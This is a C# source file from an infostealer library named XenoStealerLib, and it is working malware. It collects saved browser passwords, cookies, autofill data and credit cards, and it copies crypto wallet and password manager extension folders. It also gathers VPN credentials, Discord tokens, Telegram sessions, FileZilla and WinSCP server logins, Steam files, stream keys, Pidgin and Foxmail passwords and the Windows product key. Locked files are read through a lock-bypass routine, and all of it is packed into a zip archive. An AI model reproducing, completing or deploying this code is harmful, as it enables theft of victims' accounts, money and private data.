using XenoStealerLib.Utils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Serialization;
using static XenoStealerLib.Applications;
using static XenoStealerLib.Utils.Outlook;

namespace XenoStealerLib
{
    public class InfoDataZipCompiler
    {
        private bool Aggresive;
        private MemoryStream ZipMemoryStream;
        private ZipArchive ZipFile;
        private object SafeZipAddObj = new object();
        private Applications applications;
        private Chromium chromium;
        private Gecko gecko;
        public InfoDataZipCompiler(bool aggresive = false)
        {
            INIT(aggresive);
        }

        private void INIT(bool aggresive)
        {
            Aggresive = aggresive;
            if (ZipMemoryStream != null)
            {
                ZipMemoryStream.Dispose();
            }
            if (ZipFile != null)
            {
                ZipFile.Dispose();
            }
            applications = new Applications(Aggresive);
            chromium = new Chromium(Aggresive);
            gecko = new Gecko(Aggresive);
            ZipMemoryStream = new MemoryStream();
            ZipFile = new ZipArchive(ZipMemoryStream, ZipArchiveMode.Create);
        }

        private void AddFile(string filepath, string filename, byte[] filedata, CompressionLevel compressionLevel = CompressionLevel.Optimal)
        {
            lock (SafeZipAddObj)
            {
                string entryName = Path.Combine(filepath, filename);
                ZipArchiveEntry fileInArchive = ZipFile.CreateEntry(entryName, compressionLevel);
                if (fileInArchive.Length != 0)
                {
                    throw new Exception("You can not overwrite existing documents");
                }
                using (Stream zipFileStream = fileInArchive.Open())
                {
                    zipFileStream.Write(filedata, 0, filedata.Length);
                }
            }
        }

        private void AddFile(string filepath, byte[] filedata, CompressionLevel compressionLevel = CompressionLevel.Optimal)
        {
            AddFile(filepath, "", filedata, compressionLevel);
        }

        public byte[] GetZipBytes()
        {
            ZipFile.Dispose();
            byte[] zipData = ZipMemoryStream.ToArray();
            ZipMemoryStream.Dispose();
            return zipData;
        }

        private string FindLongestCommonPrefix(string[] strs)
        {
            if (strs == null || strs.Length == 0)
                return null;

            string shortest = strs[0];
            foreach (string str in strs)
            {
                if (str.Length < shortest.Length)
                    shortest = str;
            }

            for (int i = 0; i < shortest.Length; i++)
            {
                char currentChar = shortest[i];
                foreach (string str in strs)
                {
                    if (str[i] != currentChar)
                        return shortest.Substring(0, i);
                }
            }

            return null;
        }

        private byte[] SpecialFileRead(string path, bool aggresive = true)
        {
            byte[] output = FileLockBypasser.HijackAndReadLockedFile(path);
            if (output == null && !aggresive)
            {
                return null;
            }
            else if (output != null)
            {
                return output;
            }

            string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            FileLockBypasser.AggresiveFileCopy(path, tempDbPath, true);
            if (File.Exists(tempDbPath))
            {
                try
                {
                    output = File.ReadAllBytes(tempDbPath);
                }
                catch
                {
                }
                finally
                {
                    File.Delete(tempDbPath);
                }
            }
            return output;
        }
        private string RemoveStartingSlash(string path)
        {
            if (path.StartsWith("\\") || path.StartsWith("/"))
            {
                return path.Substring(1);
            }
            return path;
        }

        private void AddSystemFolderToZip(string SystemPath, string zipPath)
        {
            DirectoryInfo pathInfo = new DirectoryInfo(SystemPath);
            FileInfo[] Files = pathInfo.GetFiles("*");
            foreach (FileInfo file in Files)
            {
                byte[] fileBytes = SpecialFileRead(file.FullName, Aggresive);
                string filenamePath = RemoveStartingSlash(file.FullName.Substring(pathInfo.FullName.Length));
                string filePath = Path.Combine(zipPath, filenamePath);
                AddFile(filePath, fileBytes);
            }
        }

        private void AddChromiumData()
        {
            Chromium.ChromiumData chromedata = chromium.GetImportant();

            foreach (Chromium.LoginHolder logons in chromedata.Logins)
            {
                string infoFile = "";
                string path = Path.Combine("Chromium", logons.browser, logons.profile);
                string filename = "logons.txt";
                foreach (Chromium.Login logon in logons.logins)
                {
                    if (infoFile != "")
                    {
                        infoFile += Environment.NewLine;
                        infoFile += Environment.NewLine;
                    }
                    infoFile += "URL: " + logon.url;
                    infoFile += Environment.NewLine;
                    infoFile += "USERNAME: " + logon.username;
                    infoFile += Environment.NewLine;
                    infoFile += "PASSWORD: " + logon.password;
                    infoFile += Environment.NewLine;
                }
                if (infoFile != "")
                {
                    AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
                }
            }
            foreach (Chromium.AutoFillHolder autofills in chromedata.AutoFills)
            {
                string infoFile = "";
                string path = Path.Combine("Chromium", autofills.browser, autofills.profile);
                string filename = "autofills.txt";
                foreach (Chromium.AutoFill autofill in autofills.autofills)
                {
                    if (infoFile != "")
                    {
                        infoFile += Environment.NewLine;
                        infoFile += Environment.NewLine;
                    }
                    infoFile += "NAME: " + autofill.name;
                    infoFile += Environment.NewLine;
                    infoFile += "VALUE: " + autofill.value;
                    infoFile += Environment.NewLine;
                }
                if (infoFile != "")
                {
                    AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
                }
            }
            foreach (Chromium.CookieHolder cookies in chromedata.Cookies)
            {
                string infoFile = "";
                string path = Path.Combine("Chromium", cookies.browser, cookies.profile);
                string filename = "cookies.txt";
                foreach (Chromium.Cookie cookie in cookies.cookies)
                {
                    if (infoFile != "")
                    {
                        infoFile += Environment.NewLine;
                        infoFile += Environment.NewLine;
                    }
                    infoFile += "HOST: " + cookie.host;
                    infoFile += Environment.NewLine;
                    infoFile += "PATH: " + cookie.path;
                    infoFile += Environment.NewLine;
                    infoFile += "EXPIRES: " + cookie.expires.ToString();
                    infoFile += Environment.NewLine;
                    infoFile += "VALUE: " + cookie.value;
                    infoFile += Environment.NewLine;
                }
                if (infoFile != "")
                {
                    AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
                }
            }
            foreach (Chromium.CreditCardHolder creditCards in chromedata.CreditCards)
            {
                string infoFile = "";
                string path = Path.Combine("Chromium", creditCards.browser, creditCards.profile);
                string filename = "creditCards.txt";
                foreach (Chromium.CreditCard creditCard in creditCards.creditCards)
                {
                    if (infoFile != "")
                    {
                        infoFile += Environment.NewLine;
                        infoFile += Environment.NewLine;
                    }
                    infoFile += "NAME: " + creditCard.name;
                    infoFile += Environment.NewLine;
                    infoFile += "NUMBER: " + creditCard.number;
                    infoFile += Environment.NewLine;
                    infoFile += "MONTH: " + creditCard.month;
                    infoFile += Environment.NewLine;
                    infoFile += "YEAR: " + creditCard.year;
                    infoFile += Environment.NewLine;
                    infoFile += "LAST MODIFIED: " + creditCard.date_modified.ToString();
                    infoFile += Environment.NewLine;
                }
                if (infoFile != "")
                {
                    AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
                }
            }
            foreach (Chromium.CryptoExtensionHolder cryptoExtensions in chromedata.CryptoExtensions)
            {
                string rootPath = Path.Combine("Chromium", cryptoExtensions.browser, cryptoExtensions.profile, "Extension", "Crypto");
                foreach (Chromium.CryptoExtension cryptoExtension in cryptoExtensions.extensions)
                {
                    string path = Path.Combine(rootPath, cryptoExtension.name);
                    try
                    {
                        AddSystemFolderToZip(cryptoExtension.path, path);
                    }
                    catch { }

                }
            }
            foreach (Chromium.PasswordExtensionHolder passwordExtensions in chromedata.PasswordExtensions)
            {
                string rootPath = Path.Combine("Chromium", passwordExtensions.browser, passwordExtensions.profile, "Extension", "PasswordManagers");
                foreach (Chromium.PasswordExtension passwordExtension in passwordExtensions.extensions)
                {
                    string path = Path.Combine(rootPath, passwordExtension.name);
                    try
                    {
                        AddSystemFolderToZip(passwordExtension.path, path);
                    }
                    catch { }

                }
            }
        }

        private void AddGeckoData()
        {
            Gecko.GeckoData geckoData = gecko.GetImportant();
            foreach (Gecko.LoginHolder logons in geckoData.Logins)
            {
                string infoFile = "";
                string path = Path.Combine("Gecko", logons.browser, logons.profile);
                string filename = "logons.txt";
                foreach (Gecko.Login logon in logons.logins)
                {
                    if (infoFile != "")
                    {
                        infoFile += Environment.NewLine;
                        infoFile += Environment.NewLine;
                    }
                    infoFile += "URL: " + logon.url;
                    infoFile += Environment.NewLine;
                    infoFile += "USERNAME: " + logon.username;
                    infoFile += Environment.NewLine;
                    infoFile += "PASSWORD: " + logon.password;
                    infoFile += Environment.NewLine;
                }
                if (infoFile != "")
                {
                    AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
                }
            }
            foreach (Gecko.AutoFillHolder autofills in geckoData.AutoFills)
            {
                string infoFile = "";
                string path = Path.Combine("Gecko", autofills.browser, autofills.profile);
                string filename = "autofills.txt";
                foreach (Gecko.AutoFill autofill in autofills.autofills)
                {
                    if (infoFile != "")
                    {
                        infoFile += Environment.NewLine;
                        infoFile += Environment.NewLine;
                    }
                    infoFile += "NAME: " + autofill.name;
                    infoFile += Environment.NewLine;
                    infoFile += "VALUE: " + autofill.value;
                    infoFile += Environment.NewLine;
                }
                if (infoFile != "")
                {
                    AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
                }
            }
            foreach (Gecko.CookieHolder cookies in geckoData.Cookies)
            {
                string infoFile = "";
                string path = Path.Combine("Gecko", cookies.browser, cookies.profile);
                string filename = "cookies.txt";
                foreach (Gecko.Cookie cookie in cookies.cookies)
                {
                    if (infoFile != "")
                    {
                        infoFile += Environment.NewLine;
                        infoFile += Environment.NewLine;
                    }
                    infoFile += "HOST: " + cookie.host;
                    infoFile += Environment.NewLine;
                    infoFile += "PATH: " + cookie.path;
                    infoFile += Environment.NewLine;
                    infoFile += "EXPIRES: " + cookie.expires.ToString();
                    infoFile += Environment.NewLine;
                    infoFile += "VALUE: " + cookie.value;
                    infoFile += Environment.NewLine;
                }
                if (infoFile != "")
                {
                    AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
                }
            }

        }

        private void AddCryptoApplications()
        {
            foreach (Crypto_applications.FunctionInfo Function in Crypto_applications.GetFunctions())
            {
                try
                {
                    string zipPath = Path.Combine("Crypto Applications", Function.name);
                    if (Function.isFile)
                    {
                        Tuple<bool, string> fileInfo = Function.Call();
                        if (!fileInfo.Item1)
                        {
                            continue;
                        }
                        string filePath = fileInfo.Item2;
                        byte[] fileData = SpecialFileRead(filePath, Aggresive);
                        if (fileData != null)
                        {
                            AddFile(zipPath, Path.GetFileName(filePath), fileData);
                        }
                    }
                    else if (Function.isDirectory)
                    {
                        Tuple<bool, string> DirectoryInfo = Function.Call();
                        if (!DirectoryInfo.Item1)
                        {
                            continue;
                        }
                        string DirectoryPath = DirectoryInfo.Item2;
                        AddSystemFolderToZip(DirectoryPath, zipPath);
                    }
                }
                catch
                {
                }
            }
        }

        private void AddVpns() 
        {
            string infoFile = "";
            string nordpath = Path.Combine("VPNS", "NordVPN");
            string nordPathFiles = Path.Combine("VPNS", "NordVPN", "files");
            string nordFilename = "accountData.txt";
            foreach (Vpns.NordVpnInfo nordInfo in applications.GetNordVpnInfo()) 
            {
                if (infoFile != "") 
                {
                    infoFile += Environment.NewLine;
                    infoFile += Environment.NewLine;
                }
                infoFile += "USERNAME: " + nordInfo.username;
                infoFile += Environment.NewLine;
                infoFile += "PASSWORD: " + nordInfo.password;
                infoFile += Environment.NewLine;
                try
                {
                    AddSystemFolderToZip(nordInfo.FullPath, nordPathFiles);
                }
                catch { }
            }
            if (infoFile != "")
            {
                AddFile(nordpath, nordFilename, Encoding.UTF8.GetBytes(infoFile));
            }
            string openvpnPath = Path.Combine("VPNS", "OpenVPN");
            foreach (string ovpnfile in applications.GetOpenVpnsFiles())
            {
                try
                {
                    byte[] fileBytes = SpecialFileRead(ovpnfile, Aggresive);
                    AddFile(openvpnPath, Path.GetFileName(ovpnfile), fileBytes);
                } catch { }
            }
            string ProtonPath = Path.Combine("VPNS", "ProtonVPN");
            string[] profilesData = applications.GetProtonVpnFiles();
            if (profilesData.Length > 0) 
            {
                string rootDir = FindLongestCommonPrefix(profilesData);
                if (rootDir == null)
                {
                    rootDir = Path.GetDirectoryName(profilesData[0]);
                }
                foreach (string configFile in profilesData) 
                {
                    try
                    {
                        string zipPath= RemoveStartingSlash(configFile.Substring(rootDir.Length));
                        string path= Path.Combine(ProtonPath, zipPath);
                        byte[] fileBytes = SpecialFileRead(configFile, Aggresive);
                        AddFile(path, fileBytes);
                    }
                    catch { }
                }

            }

        }
        private void Applications_AddTelegram()
        {
            FileInfo[] telegramFileInfos = applications.GetTelegramFiles();
            if (telegramFileInfos == null || telegramFileInfos.Length == 0)
            {
                return;
            }
            string[] telegramFiles = applications.GetTelegramFiles().Select(o => o.FullName).ToArray();
            string removeRoot = FindLongestCommonPrefix(telegramFiles);
            if (removeRoot == null || removeRoot == "")
            {
                return;
            }
            string zipPath = Path.Combine("Applications", "Telegram");
            foreach (string file in telegramFiles) 
            { 
                string zipFilePath=RemoveStartingSlash(file.Substring(removeRoot.Length));
                string path = Path.Combine(zipPath, zipFilePath);
                try
                {
                    byte[] fileBytes = SpecialFileRead(file, Aggresive);
                    AddFile(path, fileBytes);
                }
                catch { }
            }

        }
        private void Applications_AddFoxMail() 
        {
            string infoFile = "";
            string path = Path.Combine("Applications", "Foxmail");
            string filename = "AccountInfo.txt";
            foreach (Applications.FoxMailInfo foxMailInfo in applications.GetFoxMailInfo()) 
            {
                if (infoFile != "")
                {
                    infoFile += Environment.NewLine;
                    infoFile += Environment.NewLine;
                }
                infoFile += "ACCOUNT: " + foxMailInfo.Account;
                infoFile += Environment.NewLine;
                infoFile += "PASSWORD: " + foxMailInfo.Password;
                infoFile += Environment.NewLine;
                infoFile += "ISPOP3: " + foxMailInfo.isPop3.ToString();
                infoFile += Environment.NewLine;
            }
            if (infoFile != "")
            {
                AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
            }
        }

        private void Applications_AddOutlook() 
        {
            string infoFile = "";
            string path = Path.Combine("Applications", "Outlook");
            string filename = "RetrivedInfo.txt";
            foreach (Outlook.OutlookInfo outlookInfo in applications.GetOutlookInfo())
            {
                if (infoFile != "")
                {
                    infoFile += Environment.NewLine;
                    infoFile += Environment.NewLine;
                }
                infoFile += "KEYNAME: " + outlookInfo.RegistryKey;
                infoFile += Environment.NewLine;
                infoFile += "VALUE: " + outlookInfo.RegistryValue;
                infoFile += Environment.NewLine;
            }
            if (infoFile != "")
            {
                AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
            }
        }

        private void Applications_AddFilezilla() 
        {
            string infoFile = "";
            string path = Path.Combine("Applications", "Filezilla");
            string filename = "ConnectedServersInfo.txt";
            foreach (Applications.FileZillaInfo fileZillaInfo in applications.GetFileZillaInfo()) 
            {
                if (infoFile != "")
                {
                    infoFile += Environment.NewLine;
                    infoFile += Environment.NewLine;
                }
                infoFile += "HOST: " + fileZillaInfo.Host;
                infoFile += Environment.NewLine;
                infoFile += "PORT: " + fileZillaInfo.Port;
                infoFile += Environment.NewLine;
                infoFile += "USERNAME: " + fileZillaInfo.User;
                infoFile += Environment.NewLine;
                infoFile += "PASSWORD: " + fileZillaInfo.Password;
                infoFile += Environment.NewLine;
                infoFile += "PASSWORD_MASTERKEY_ENCRYPTED: " + fileZillaInfo.Encrypted.ToString();
                infoFile += Environment.NewLine;
            }
            if (infoFile != "")
            {
                AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
            }
        }

        private void Applications_AddwinSCP() 
        {
            string infoFile = "";
            string path = Path.Combine("Applications", "WinSCP");
            string filename = "ConnectedServersInfo.txt";
            foreach (Applications.WinscpInfo winscpInfo in applications.GetWinscpInfo())
            {
                if (infoFile != "")
                {
                    infoFile += Environment.NewLine;
                    infoFile += Environment.NewLine;
                }
                infoFile += "HOSTNAME: " + winscpInfo.Hostname;
                infoFile += Environment.NewLine;
                infoFile += "PORT: " + winscpInfo.Port;
                infoFile += Environment.NewLine;
                infoFile += "USERNAME: " + winscpInfo.Username;
                infoFile += Environment.NewLine;
                infoFile += "PASSWORD: " + winscpInfo.Password;
                infoFile += Environment.NewLine;
                infoFile += "PASSWORD_MASTERKEY_ENCRYPTED: " + winscpInfo.isMasterPassword.ToString();
                infoFile += Environment.NewLine;
                if (winscpInfo.isMasterPassword) 
                {
                    infoFile += "MASTER_KEY_VERIFIER: " + winscpInfo.MasterPasswordVerifier;
                    infoFile += Environment.NewLine;
                }
            }
            if (infoFile != "")
            {
                AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
            }
        }

        private void Applications_AddSteam() 
        {
            Applications.SteamInfo info = applications.GetSteamInfo();
            if (info == null) 
            {
                return;
            }
            string[] ssnfFiles = info.GetSsnfFilePaths();
            string[] vdfFiles = info.GetVdfFilePaths();

            string gamesString=string.Join(Environment.NewLine, info.games);
            string SteamPath = Path.Combine("Applications", "Steam");
            AddFile(SteamPath, "games.txt", Encoding.UTF8.GetBytes(gamesString));

            string ssnfPath = Path.Combine(SteamPath, "SSNF files");
            foreach (string ssnfFile in ssnfFiles) 
            {
                try
                {
                    byte[] fileBytes = SpecialFileRead(ssnfFile, Aggresive);
                    AddFile(ssnfPath, Path.GetFileName(ssnfFile), fileBytes);
                }
                catch { }
            }

            string vdfPath = Path.Combine(SteamPath, "VDF files");
            foreach (string vdfFile in vdfFiles)
            {
                try
                {
                    byte[] fileBytes = SpecialFileRead(vdfFile, Aggresive);
                    AddFile(vdfPath, Path.GetFileName(vdfFile), fileBytes);
                }
                catch { }
            }

        }

        private void Applications_AddNgrok() 
        {
            string ngrokPath = Path.Combine("Applications", "Ngrok");
            string ngrokConfigPath = applications.GetNgrokConfigPath();
            if (ngrokConfigPath == null || ngrokConfigPath == "") 
            {
                return;
            }
            try
            {
                byte[] fileBytes = SpecialFileRead(ngrokConfigPath, Aggresive);
                AddFile(ngrokPath, Path.GetFileName(ngrokConfigPath), fileBytes);
            }
            catch { }
        }

        private void Applications_AddOBS() 
        {
            string infoFile = "";
            string path = Path.Combine("Applications", "OBS");
            string filename = "stream keys.txt";
            foreach (Applications.OBSInfo obsinfo in applications.GetOBSInfo())
            {
                if (infoFile != "")
                {
                    infoFile += Environment.NewLine;
                    infoFile += Environment.NewLine;
                }

                infoFile += "SERVICE: " + obsinfo.Service;
                infoFile += Environment.NewLine;
                infoFile += "STREAMKEY: " + obsinfo.StreamKey;
            }
            if (infoFile != "")
            {
                AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
            }
        }

        private void Applications_AddPidgin() 
        {
            string infoFile = "";
            string path = Path.Combine("Applications", "Pidgin");
            string filename = "AccountInfo.txt";
            foreach (Applications.PidginInfo pidginInfo in applications.GetPidginInfo())
            {
                if (infoFile != "")
                {
                    infoFile += Environment.NewLine;
                    infoFile += Environment.NewLine;
                }

                infoFile += "PROTOCOL: " + pidginInfo.Protocol;
                infoFile += Environment.NewLine;
                infoFile += "USERNMAE: " + pidginInfo.Username;
                infoFile += Environment.NewLine;
                infoFile += "PASSWORD: " + pidginInfo.Password;
                infoFile += Environment.NewLine;
            }
            if (infoFile != "")
            {
                AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
            }
        }

        private void Applications_AddWindowsProductKey() 
        {
            string WindowsProductKeyPath = Path.Combine("Applications", "Windows Product Key");
            string WindowsProductKey = applications.GetWindowsProductId();
            if (WindowsProductKey == null || WindowsProductKey == "")
            {
                return;
            }
            AddFile(WindowsProductKeyPath, "key.txt", Encoding.UTF8.GetBytes(WindowsProductKey));
        }

        private void Applications_AddDiscord() 
        {
            string infoFile = "";
            string path = Path.Combine("Applications", "Discord");
            string filename = "tokens.txt";
            foreach (Discord.DiscordTokenInfo tokenInfo in applications.GetDiscordTokens())
            {
                if (infoFile != "")
                {
                    infoFile += Environment.NewLine;
                    infoFile += Environment.NewLine;
                }

                infoFile += "TOKEN: " + tokenInfo.token;
                infoFile += Environment.NewLine;
                infoFile += "TOKEN_INFO: " + tokenInfo.userInfoData;
                infoFile += Environment.NewLine;
                infoFile += "APPLICATION: " + tokenInfo.application;
                infoFile += Environment.NewLine;
            }
            if (infoFile != "")
            {
                AddFile(path, filename, Encoding.UTF8.GetBytes(infoFile));
            }
            
        }
        
        private void AddApplications()
        {
            Action[] funcs = new Action[] { Applications_AddTelegram, Applications_AddFoxMail, Applications_AddOutlook, Applications_AddFilezilla, Applications_AddwinSCP, Applications_AddSteam, Applications_AddNgrok, Applications_AddOBS, Applications_AddPidgin, Applications_AddWindowsProductKey, Applications_AddDiscord };
            List<Thread> threads = new List<Thread>();
            foreach (Action func in funcs)
            {
                try 
                {
                    func();
                } 
                catch { }
            }
        }

        private void AddApplicationsThreaded() 
        {
            Action[] funcs = new Action[] { Applications_AddTelegram, Applications_AddFoxMail, Applications_AddOutlook, Applications_AddFilezilla, Applications_AddwinSCP, Applications_AddSteam, Applications_AddNgrok, Applications_AddOBS, Applications_AddPidgin, Applications_AddWindowsProductKey, Applications_AddDiscord };
            List<Thread> threads = new List<Thread>();
            foreach (Action func in funcs)
            {
                Thread funcThread = new Thread(()=> { try { func(); } catch { } });
                funcThread.Start();
                threads.Add(funcThread);
            }
            foreach (Thread funcThread in threads) 
            {
                funcThread.Join();
            }

        }

        public void StartThreaded() 
        {
            Action[] funcs = new Action[] { AddChromiumData, AddGeckoData, AddCryptoApplications, AddVpns, AddApplications };
            List<Thread> threads = new List<Thread>();
            foreach (Action func in funcs)
            {
                Thread funcThread = new Thread(() => { try { func(); } catch { } });
                funcThread.Start();
                threads.Add(funcThread);
            }
            foreach (Thread funcThread in threads)
            {
                funcThread.Join();
            }
        }

        public void StartAndApplicationsThreaded()
        {
            Action[] funcs = new Action[] { AddChromiumData, AddGeckoData, AddCryptoApplications, AddVpns, AddApplicationsThreaded };
            List<Thread> threads = new List<Thread>();
            foreach (Action func in funcs)
            {
                Thread funcThread = new Thread(() => { try { func(); } catch { } });
                funcThread.Start();
                threads.Add(funcThread);
            }
            foreach (Thread funcThread in threads)
            {
                funcThread.Join();
            }
        }

        public void Start() 
        {
            Action[] funcs = new Action[] { AddChromiumData, AddGeckoData, AddCryptoApplications, AddVpns, AddApplications };
            List<Thread> threads = new List<Thread>();
            foreach (Action func in funcs)
            {
                try
                {
                    func();
                }
                catch { }
            }
        }

    }
}
